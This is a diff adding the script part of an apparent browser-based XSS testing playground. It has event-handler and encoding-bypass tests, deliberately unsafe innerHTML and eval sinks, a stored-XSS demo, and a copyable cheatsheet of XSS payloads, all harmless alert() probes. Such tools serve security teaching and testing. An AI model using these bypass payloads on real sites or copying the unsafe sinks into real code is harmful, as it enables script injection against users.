+    setTimeout(function() { setStatus('s-autofocus', triggerCount > before); }, 200);
+  }
+
+  function testAnimationStart() {
+    var output = document.getElementById('event-output');
+    window._xssOutput = output;
+    var before = triggerCount;
+    output.innerHTML = '<style>@keyframes xssanim{from{opacity:1}to{opacity:1}}</style><div style="animation:xssanim 0.01s" onanimationstart="xssAlert(\'onanimationstart fired\')">animation target</div>';
+    setTimeout(function() { setStatus('s-animation', triggerCount > before); }, 200);
+  }
+
+  // ---- Encoding Bypass Tests ----
+
+  function testEntities() {
+    var output = document.getElementById('bypass-output');
+    window._xssOutput = output;
+    var before = triggerCount;
+    // The entity-encoded payload — decoded by the browser when parsed as HTML
+    output.innerHTML = '<img src=x onerror=&#x78;&#x73;&#x73;&#x41;&#x6c;&#x65;&#x72;&#x74;(\'entity encoded\')>';
+    setTimeout(function() { setStatus('s-entities', triggerCount > before); }, 200);
+  }
+
+  function testMixedCase() {
+    window._xssOutput = document.getElementById('bypass-output');
+    var before = triggerCount;
+    // Mixed-case script via document.write in iframe
+    var iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.sandbox = 'allow-scripts allow-same-origin';
+    document.body.appendChild(iframe);
+    iframe.contentDocument.open();
+    iframe.contentDocument.write('<ScRiPt>parent.xssAlert("mixed case ScRiPt tag")<\/ScRiPt>');
+    iframe.contentDocument.close();
+    setTimeout(function() { setStatus('s-mixedcase', triggerCount > before); document.body.removeChild(iframe); }, 300);
+  }
+
+  function testSVGScript() {
+    var output = document.getElementById('bypass-output');
+    window._xssOutput = output;
+    var before = triggerCount;
+    // Script inside SVG via innerHTML fires (unlike HTML)
+    output.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg"><script>xssAlert("SVG script tag")<\/script><\/svg>';
+    setTimeout(function() { setStatus('s-svgscript', triggerCount > before); }, 200);
+  }
+
+  function testDoubleEncoding() {
+    var output = document.getElementById('bypass-output');
+    window._xssOutput = output;
+    var before = triggerCount;
+    // Simulate server-side double-decode: %253C -> %3C -> <
+    var raw = '%253Cimg%2520src%253Dx%2520onerror%253DxssAlert(\'double%2520encoded\')%253E';
+    var once = decodeURIComponent(raw);    // %3Cimg%20src%3Dx%20onerror%3D...%3E
+    var twice = decodeURIComponent(once);  // <img src=x onerror=...>
+    output.innerHTML = twice;
+    setTimeout(function() { setStatus('s-double-enc', triggerCount > before); }, 200);
+  }
+
+  // ---- DOM Sink Playground ----
+
+  function sinkInject(sink) {
+    var payload = document.getElementById('payload-input').value;
+    var output = document.getElementById('sink-output');
+    window._xssOutput = output;
+    var label = document.getElementById('sink-label-current');
+    label.textContent = sink;
+
+    if (sink === 'innerHTML') {
+      output.innerHTML = payload;
+    } else if (sink === 'outerHTML') {
+      var tmp = document.createElement('div');
+      tmp.textContent = '(outerHTML target)';
+      output.innerHTML = '';
+      output.appendChild(tmp);
+      tmp.outerHTML = payload;
+    } else if (sink === 'insertAdjacentHTML') {
+      output.innerHTML = '';
+      output.insertAdjacentHTML('beforeend', payload);
+    } else if (sink === 'textContent') {
+      output.textContent = payload;
+    } else if (sink === 'innerText') {
+      output.innerText = payload;
+    } else if (sink === 'createTextNode') {
+      output.innerHTML = '';
+      output.appendChild(document.createTextNode(payload));
+    } else if (sink === 'eval') {
+      try { eval(payload); output.textContent = 'eval() called'; } catch(e) { output.textContent = 'eval error: ' + e.message; }
+    }
+  }
+
+  function testHrefSink() {
+    var val = document.getElementById('href-input').value;
+    location.href = val;
+  }
+
+  function testAnchorSink() {
+    var val = document.getElementById('href-input').value;
+    var out = document.getElementById('href-output');
+    out.innerHTML = '<a href="' + escapeHTMLAttr(val) + '" style="color:#8ab4f8;">&#9654; Click this link (href=' + escapeHTML(val) + ')</a>';
+  }
+
+  function escapeHTMLAttr(str) {
+    return str.replace(/"/g, '&quot;').replace(/'/g, '&#x27;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  }
+
+  // ---- Stored XSS Simulation ----
+
+  function storePayload() {
+    var val = document.getElementById('stored-input').value;
+    localStorage.setItem('xss-test-payload', val);
+    document.getElementById('stored-output').textContent = 'Saved: "' + val + '"';
+  }
+
+  function renderStoredUnsafe() {
+    window._xssOutput = document.getElementById('stored-output');
+    var val = localStorage.getItem('xss-test-payload');
+    if (!val) { document.getElementById('stored-output').textContent = 'Nothing stored. Save a payload first.'; return; }
+    document.getElementById('stored-output').innerHTML = val; // UNSAFE
+  }
+
+  function renderStoredSafe() {
+    var val = localStorage.getItem('xss-test-payload');
+    if (!val) { document.getElementById('stored-output').textContent = 'Nothing stored. Save a payload first.'; return; }
+    document.getElementById('stored-output').textContent = val; // SAFE — renders as text
+  }
+
+  function clearStoredPayload() {
+    localStorage.removeItem('xss-test-payload');
+    document.getElementById('stored-output').textContent = 'Cleared.';
+  }
+
+  // ---- Payload Cheatsheet ----
+
+  var payloads = [
+    { label: 'Basic script tag', code: '<script>alert(1)<\/script>' },
+    { label: 'img onerror', code: '<img src=x onerror=alert(1)>' },
+    { label: 'img onerror (no quotes)', code: "<img src=x onerror=alert`1`>" },
+    { label: 'svg onload', code: '<svg onload=alert(1)>' },
+    { label: 'svg/script', code: '<svg><script>alert(1)<\/script><\/svg>' },
+    { label: 'iframe srcdoc', code: '<iframe srcdoc="<script>alert(1)<\/script>">' },
+    { label: 'details ontoggle', code: '<details open ontoggle=alert(1)>' },
+    { label: 'video onerror', code: '<video src=x onerror=alert(1)>' },
+    { label: 'body onpageshow', code: '<body onpageshow=alert(1)>' },
+    { label: 'input autofocus onfocus', code: '<input autofocus onfocus=alert(1)>' },
+    { label: 'select autofocus onfocus', code: '<select autofocus onfocus=alert(1)>' },
+    { label: 'textarea autofocus onfocus', code: '<textarea autofocus onfocus=alert(1)>' },
+    { label: 'javascript: href', code: '<a href="javascript:alert(1)">click</a>' },
+    { label: 'javascript: iframe', code: '<iframe src="javascript:alert(1)"></iframe>' },
+    { label: 'onanimationstart', code: '<style>@keyframes x{}</style><div style="animation:x" onanimationstart=alert(1)>' },
+    { label: 'ontransitionend', code: '<div style="transition:color 0.1s" ontransitionend=alert(1)>' },
+    { label: 'marquee onstart', code: '<marquee onstart=alert(1)>' },
+    { label: 'object data javascript:', code: '<object data="javascript:alert(1)">' },
+    { label: 'math href', code: '<math href="javascript:alert(1)">click</math>' },
+    { label: 'HTML entity bypass', code: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>' },
+    { label: 'Template literal injection', code: 'alert`1`' },
+    { label: 'eval string', code: 'eval("alert(1)")' },
+    { label: 'Function constructor', code: 'new Function("alert(1)")()' },
+    { label: 'DOM clobbering anchor', code: '<a id=x href="javascript:alert(1)">click</a>' },
+  ];
+
+  var grid = document.getElementById('payload-grid');
+  payloads.forEach(function(p) {
+    var card = document.createElement('div');
+    card.className = 'payload-card';
+    card.innerHTML =
+      '<div class="label">' + escapeHTML(p.label) + '</div>' +
+      '<code>' + escapeHTML(p.code) + '</code>' +
+      '<button onclick="copyPayload(this, \'' + escapeHTMLAttr(p.code) + '\')">Copy</button>';
+    grid.appendChild(card);
+  });
+
+  function copyPayload(btn, code) {
+    navigator.clipboard.writeText(code).then(function() {
+      var orig = btn.textContent;
+      btn.textContent = 'Copied!';
+      setTimeout(function() { btn.textContent = orig; }, 1500);
+    });
+  }
+</script>
+
+</body>
+</html>
